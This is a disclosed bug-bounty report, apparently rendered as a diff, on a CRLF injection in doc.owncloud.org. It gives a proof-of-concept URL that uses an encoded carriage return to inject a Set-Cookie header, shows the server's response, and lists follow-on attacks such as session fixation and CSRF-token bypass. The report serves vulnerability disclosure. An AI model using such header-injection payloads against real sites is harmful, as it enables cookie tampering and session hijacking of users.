@@ -1,0 +1,40 @@
+# [doc.owncloud.org] CRLF Injection
+
+## Report Details
+- **Report ID**: 154275
+- **URL**: https://hackerone.com/reports/154275
+- **State**: Closed
+- **Severity**: N/A
+- **Submitted**: 2016-07-27T08:08:07.446Z
+- **Disclosed**: 2016-11-02T13:38:30.583Z
+
+## Reporter
+- **Username**: bobrov
+- **Name**: N/A
+
+## Team
+- **Name**: N/A
+- **Handle**: owncloud
+
+## Vulnerability Information
+**PoC**:
+`http://doc.owncloud.org/%23%0dSet-Cookie:crlf=injection;domain=.owncloud.org;`
+
+**HTTP Response**:
+```
+HTTP/1.1 301 Moved Permanently\r\n
+Date: Wed, 27 Jul 2016 07:58:47 GMT\r\n
+Server: Apache\r\n
+Location: https://doc.owncloud.org/#\r                      < injection \r
+Set-Cookie:crlf=injection;domain=.owncloud.org;\r\n
+```
+
+**Result**:
+Creating a cookie-param "crlf=injection" on *.owncloud.org
+
+This vulnerability could be used in combination with others. For example, XSS via Cookie, bypass Double Submit Cookie csrf protection or session fixation. HTTP headers delimiter \r (%0d) is supported by any web browser other than FireFox.
+
+HTTP Strict Transport Security can block the attack, if the user has already visited the site doc.owncloud.org.
+
+## Attachments
+No attachments
